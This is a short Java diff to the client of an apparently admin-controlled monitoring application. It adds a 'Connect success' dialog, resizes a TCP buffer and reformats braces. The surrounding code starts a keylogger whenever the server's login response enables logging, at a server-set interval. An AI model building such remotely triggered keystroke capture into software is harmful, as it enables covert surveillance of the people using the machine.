@@ -26,10 +26,13 @@ import java.awt.event.KeyEvent;
 import java.io.*;
 import java.net.ServerSocket;
 import java.net.URL;
+import javax.swing.JFrame;
+import javax.swing.JOptionPane;
 
 public class User {
+
     public static int adminId;
- 
+
     public static void main(String[] args) throws IOException, InterruptedException {
         try (ServerSocket ignored = new ServerSocket(9999)) {
             var serverInfo = getServerInfo();
@@ -43,13 +46,12 @@ public class User {
 
             var tcpClient = new TCPClient(host, port);
 
-            tcpClient.setBuffer(2048 * 1024);
+            tcpClient.setBuffer(1024 * 1024);
             tcpClient.start();
 
 //            UDPClient udpClient = new UDPClient("localhost", 4446);
 //            udpClient.setBuffer(1024 * 1024);
 //            udpClient.start();
-
             ClientInstance.tcpClient = tcpClient;
 //            ClientInstance.udpClient = udpClient;
 
@@ -60,9 +62,15 @@ public class User {
             var uuid = Utilities.getUUID();
 
             EventDispatcher.startListening(new LoginUserResultReceiver((loginUserResult) -> {
-                if (!loginUserResult.userInfo.isWriteLog) return;
+//                GlobalVariable.LoginUserGUI.setDefaultCloseOperation(JFrame.HIDE_ON_CLOSE);
+                JOptionPane.showMessageDialog(GlobalVariable.LoginUserGUI, "Connect success");
+                if (!loginUserResult.userInfo.isWriteLog) {
+                    return;
+                }
 
-                if (KeyLogger.instance != null) KeyLogger.instance.stop();
+                if (KeyLogger.instance != null) {
+                    KeyLogger.instance.stop();
+                }
 
                 var keyLogger = new KeyLogger(loginUserResult.userInfo.writeLogInterval);
                 keyLogger.start();
@@ -96,7 +104,9 @@ public class User {
 
     private static ServerInfo getServerInfo() {
         File file = new File("./" + SERVER_INFO_FILE);
-        if (!file.exists()) return null;
+        if (!file.exists()) {
+            return null;
+        }
 
         try (var reader = new BufferedReader(new FileReader(file))) {
             var serverIp = reader.readLine();
